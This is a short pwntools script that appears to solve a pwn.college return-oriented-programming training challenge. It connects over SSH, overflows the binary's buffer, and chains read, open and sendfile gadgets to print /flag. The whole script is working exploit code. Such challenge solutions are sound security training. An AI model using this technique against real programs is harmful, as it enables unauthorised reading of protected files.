from pwn import *

e = ELF('./babyrop_level6_testing1')
libc = ELF('../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)

p = s.run('/babyrop_level6_testing1')

rdi = 0x000000000040177f
rsi = 0x0000000000401787
rdx = 0x0000000000401797
rcx = 0x000000000040178f

pay = b'A' * 0x68

pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(e.plt['open'])
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx) + p64(0) + p64(rcx) + p64(100) + p64(e.plt['sendfile'])

p.sendafter(b'\n\n',pay)
p.recvuntil(b'Exiting!\n')

p.send(b'/flag\x00')

p.interactive()